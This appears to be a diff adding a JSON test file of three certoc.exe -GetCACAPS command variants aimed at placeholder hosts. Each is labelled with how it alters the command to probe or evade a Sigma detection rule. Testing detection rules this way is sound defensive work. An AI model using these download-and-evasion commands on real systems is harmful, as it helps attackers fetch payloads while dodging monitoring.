@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\Windows\System32\certoc.exe -GetCACAPS https://example.com/certsrv/",
+    "explanation": "Substitution: Replaced IP address with a domain name to avoid matching the Sigma rule's IP-based URL detection."
+  },
+  {
+    "output": "C:\Windows\System32\certoc.exe -GetCACAPS \"https://192.0.2.10/certsrv/\"",
+    "explanation": "Insertion: Added quotes around the URL to test if the Sigma rule's string matching is affected by quotation marks."
+  },
+  {
+    "output": "C:\Windows\System32\certoc.exe -GetCACAPS https://192.0.2.10/certsrv/ -Test",
+    "explanation": "Insertion: Added an extra flag to test if the Sigma rule's detection is based solely on the URL and not other command-line arguments."
+  }
+]
